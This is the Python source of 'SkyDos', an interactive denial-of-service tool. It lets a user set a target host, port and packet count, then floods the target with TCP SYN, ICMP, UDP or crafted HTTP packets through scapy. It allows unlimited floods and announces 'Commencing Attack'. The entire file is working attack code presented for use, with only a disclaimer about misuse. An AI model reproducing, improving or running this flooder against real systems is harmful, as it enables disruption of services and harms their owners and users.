import socket
from colorama import Fore, Back, Style, init
from time import sleep
import pyfiglet
import sys
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.packet import Raw
from scapy.volatile import RandShort
from scapy.sendrecv import send
import os
init(convert=True)

target = None
port = None
count = None

def prompt():
    global target
    global port
    global count
    
    start = input(Fore.CYAN + '(SkyDos) ' + Style.RESET_ALL)
    options = str.split(start)
    if options == []:
        prompt()
    if start == 'help':
        print(Fore.YELLOW + 'Modes= tcp, icmp, udp, http' + '\n' + 'Options= target, port, count' + '\nPrint= values' + '\nOther= exit, clear' + '\n\n(Ex.): target 192.168.0.1' + Style.RESET_ALL)
        prompt()
    elif start == 'tcp' and target != None and count != None and port != None:
        Tcpprog()
    elif start == 'icmp' and target != None and count != None and port != None:
        IcmpProg()
    elif start == 'udp' and target != None and count != None and port != None:
        UdpProg()
    elif start == 'http' and target != None and count != None and port != None:
        HttpProg()
    elif start == 'values':
        print(Fore.YELLOW + 'target= ' + str(target) + '\nport= ' + str(port) + '\ncount= ' + str(count) + Style.RESET_ALL)
        prompt()
    elif options[0] == 'target':
        if len(options) != 2:
            print(Fore.RED + 'Unexpected amount of arguments' + Style.RESET_ALL)
            prompt()
        target = str(options[1]) or str(socket.gethostbyaddr(options[1]))
        prompt()
    elif options[0] == 'port':
        if len(options) != 2:
            print(Fore.RED + 'Unexpected amount of arguments' + Style.RESET_ALL)
            prompt()
        port = int(options[1])
        prompt()
    elif options[0] == 'count':
        if len(options) != 2:
            print(Fore.RED + 'Unexpected amount of arguments' + Style.RESET_ALL)
            prompt()
        count = int(options[1])
        if count == 0:
            count = float('inf')
        prompt()
    elif start == 'exit':
        print(Fore.BLUE + '\nGoodbye' + Style.RESET_ALL)
        sys.exit(1)
    elif start == 'clear':
    	os.system('cls' if os.name == 'nt' else 'clear')
    	prompt()
    else:
        print(Fore.RED + 'Illegal option' + Style.RESET_ALL)
        prompt()
        
class Tcpprog():
    def __init__(self):
        self.check_alive()

    def check_alive(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target ,port))
            print(Fore.BLUE + 'Successfull connected')
            sleep(1)
            print(Fore.RED + 'Commencing Attack' + Fore.WHITE)
            self.tcp()
        except Exception as e:
            print(e)
            print('Could not connect to target')
            prompt()

    def tcp(self):
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        raw = Raw(b"X"*1024)
        p = ip / tcp / raw
        send(p, verbose=1, count=count)
        print('Done')
        prompt()
        
class IcmpProg():
    def __init__(self):
        self.check_alive()

    def check_alive(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target ,port))
            print(Fore.BLUE + 'Successfull connected')
            sleep(1)
            print(Fore.RED + 'Commencing Attack' + Fore.WHITE)
            self.icmp()
        except Exception as e:
            print(e)
            print('Could not connect to target')
            prompt()
    
    def icmp(self):
        p = IP(dst=target)/ICMP()
        send(p, verbose=1, count=count)
        print('Done')
        prompt()
    
class UdpProg():
    def __init__(self):
        self.check_alive()

    def check_alive(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target ,port))
            print(Fore.BLUE + 'Successfull connected')
            sleep(1)
            print(Fore.RED + 'Commencing Attack' + Fore.WHITE)
            self.udp()
        except Exception as e:
            print(e)
            print('Could not connect to target')
            prompt()
    
    def udp(self):
        p = IP(dst=target)/UDP()
        send(p, verbose=1, count=count)
        print('Done')
        prompt()

class HttpProg():
    def __init__(self):
        self.check_alive()

    def check_alive(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((target ,port))
            print(Fore.BLUE + 'Successfull connected')
            sleep(1)
            print(Fore.RED + 'Commencing Attack' + Fore.WHITE)
            self.http()
        except Exception as e:
            print(e)
            print('Could not connect to target')
            prompt()
            
    def http(self):
        ip = IP(dst=target)
        tcp = TCP(sport=RandShort(), dport=port, flags="A")
        get = "GET / HTTP/1.1\r\nHost: " + target
        p = ip / tcp / get
        send(p, verbose=1, count=count)
        print('Done')
        prompt()
        
if __name__ == "__main__":
    banner = pyfiglet.figlet_format('SkyDos', font='smslant')
    print(Fore.BLUE + banner + Style.RESET_ALL)
    print(Back.RED + '*I WILL NOT BE RESPONSIBLE FOR ANY MISUSE!*' + Style.RESET_ALL)
    print('\nType ' + "'help'" + ' to list options\n')
    prompt()
